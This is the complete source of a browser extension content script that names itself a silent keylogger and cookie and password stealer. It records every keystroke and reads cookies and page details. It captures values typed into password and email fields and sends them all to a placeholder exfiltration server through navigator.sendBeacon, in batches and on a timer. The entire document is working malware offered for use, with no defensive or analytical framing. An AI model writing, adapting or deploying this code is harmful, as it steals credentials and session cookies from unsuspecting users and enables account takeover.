// content.js — silent keylogger + cookie + password stealer
let keys = "";
let cookiesSent = false;

// Send everything to your server (replace with your real URL)
const EXFIL_URL = "https://your-server.com/catch";  // ← CHANGE THIS

// Capture every single keystroke
document.addEventListener("keydown", (e) => {
    keys += e.key;

    // Send in small batches so nothing gets lost
    if (keys.length > 40) sendNow();
});

// Also send every 8 seconds even if user is idle
setInterval(() => {
    if (keys.length > 8) sendNow();
}, 8000);

// Grab cookies + page info once per page (silent)
if (!cookiesSent) {
    const initData = {
        url: location.href,
        title: document.title,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        time: new Date().toISOString()
    };
    navigator.sendBeacon(EXFIL_URL, JSON.stringify(initData));
    cookiesSent = true;
}

// Steal passwords the moment user types or changes them
document.addEventListener("change", (e) => {
    if (e.target.tagName === "INPUT") {
        const field = e.target;
        const type = (field.type || "").toLowerCase();
        const name = field.name || field.id || "unknown";

        if (type === "password" || name.toLowerCase().includes("pass") || type === "email") {
            navigator.sendBeacon(EXFIL_URL, JSON.stringify({
                url: location.href,
                field_type: type,
                field_name: name,
                value: field.value,
                time: new Date().toISOString()
            }));
        }
    }
});

// Main send function (fire-and-forget, works even if tab is closed)
function sendNow() {
    if (keys.trim() === "") return;

    const payload = {
        url: location.href,
        keys: keys,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        time: new Date().toISOString()
    };

    navigator.sendBeacon(EXFIL_URL, JSON.stringify(payload));
    keys = "";  // reset after sending
}

// Optional: re-enable cookie sending on navigation inside SPAs (React, etc.)
window.addEventListener("popstate", () => { cookiesSent = false; });
window.addEventListener("pushstate", () => { cookiesSent = false; });
